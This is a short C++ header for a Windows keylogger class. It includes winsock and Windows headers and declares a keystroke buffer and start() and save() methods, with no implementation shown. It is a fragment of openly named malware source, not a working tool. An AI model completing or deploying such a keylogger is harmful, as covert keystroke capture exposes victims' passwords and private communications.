#ifndef KEYLOGGER_HPP_
#define KEYLOGGER_HPP_

#include <winsock2.h>
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <string>
#include <cstring>
#include <cstddef>
#include <sstream>

using namespace std;

class keylogger
{
    public :
		string* a_buffer;
		int a_buffer_maximum_size;

		keylogger();

		virtual ~keylogger();

		virtual void save();

		virtual void start();
};

#endif
